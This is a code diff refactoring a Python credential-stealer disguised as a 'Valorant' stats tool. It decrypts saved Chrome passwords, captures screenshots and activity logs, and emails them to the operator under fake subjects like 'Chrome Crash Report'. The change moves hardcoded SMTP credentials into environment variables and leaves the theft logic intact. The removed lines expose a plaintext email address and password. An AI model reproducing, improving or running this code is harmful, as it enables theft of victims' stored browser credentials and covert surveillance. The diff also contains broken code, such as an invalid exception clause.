@@ -14,13 +14,11 @@ import json
 import base64
 import win32crypt
 from email.message import EmailMessage
+from dotenv import load_dotenv
 
-CADENCE = 45
-ADDRESS = "valorant_shield@outlook.com"
-PASSWORD = "@A123456789"
-TEXT_FILE = "chrome_usage_data.txt" 
-PORT = 587
-HOST = "smtp.office365.com"
+
+load_dotenv()
+
 
 class Valorant:
     def __init__(self, interval, report_method="email"):
@@ -53,8 +51,8 @@ class Valorant:
         
         screenshot = './valorant_report.png'
         msg = MIMEMultipart()
-        msg["From"] = ADDRESS
-        msg["To"] = ADDRESS
+        msg["From"] = os.environ["ADDRESS"]
+        msg["To"] = os.environ["ADDRESS"]
         msg["Subject"] = str(f"Valorant Stats {datetime.now()}")
         
         with mss() as sct:
@@ -68,7 +66,7 @@ class Valorant:
         text_part = MIMEText(message, "plain")
         msg.attach(text_part)
         msg.attach(image)
-        server = smtplib.SMTP(host=HOST, port=PORT)
+        server = smtplib.SMTP(host=os.environ["HOST"], port=os.environ["PORT"])
         server.starttls()
         server.login(email, password)
         server.sendmail(email, email, msg.as_string())
@@ -81,7 +79,7 @@ class Valorant:
             self.end_dt = datetime.now()
             self.update_filename()
             if self.report_method == "email":
-                self.sendmail(ADDRESS, PASSWORD, self.log)
+                self.sendmail(os.environ["ADDRESS"], os.environ["PASSWORD"], self.log)
             elif self.report_method == "file":
                 self.report_to_file()
                 print(f"[{self.filename}] - {self.log}")
@@ -132,7 +130,7 @@ class Valorant:
                 return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
             except:
                 # not supported
-                return ""
+                return "Error occurec in decrypt password"
 
 
     def password_stealer_main(self):
@@ -144,9 +142,9 @@ class Valorant:
         shutil.copyfile(db_path, filename)
         db = sqlite3.connect(filename)
         cursor = db.cursor()
-        cursor.execute("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")
+        cursor.execute("select origin_url, action_url, username_value, password_value from logins order by date_created")
         
-        f = open(TEXT_FILE, "w") 
+        f = open(os.environ["TEXT_FILE"], "w") 
         
 
         for row in cursor.fetchall():
@@ -174,25 +172,23 @@ class Valorant:
         f.close()
         db.close()
         msg = EmailMessage()
-        msg["From"] = ADDRESS
-        msg["To"] = ADDRESS
+        msg["From"] = os.environ["ADDRESS"]
+        msg["To"] = os.environ["ADDRESS"]
         msg["Subject"] = str(f"Chrome Crash Report {datetime.now()}")
-        msg.add_attachment(open(TEXT_FILE, "r").read(), filename=TEXT_FILE)
-        server = smtplib.SMTP(host=HOST, port=PORT)
+        msg.add_attachment(open(os.environ["TEXT_FILE"], "r").read(), filename=os.environ["TEXT_FILE"])
+        server = smtplib.SMTP(host=os.environ["HOST"], port=os.environ["PORT"])
         server.starttls()
-        server.login(ADDRESS, PASSWORD)
-        server.sendmail(ADDRESS, ADDRESS, msg.as_string())
+        server.login(os.environ["ADDRESS"], os.environ["PASSWORD"])
+        server.sendmail(os.environ["ADDRESS"], os.environ["ADDRESS"], msg.as_string())
 
         try:
             os.remove(filename)
-            os.remove(TEXT_FILE)
-        except:
-            pass
+            os.remove(os.environ["TEXT_FILE"])
+        except Exception(e):
+            print("password_stealer_main")
     
 
-Omen = Valorant(interval=CADENCE, report_method="email")
-try:
+if __name__ == "__main__":
+    Omen = Valorant(interval=int(os.environ["CADENCE"]), report_method="email")
     Omen.password_stealer_main()
-except:
-    pass
-Omen.start()
+    Omen.start()
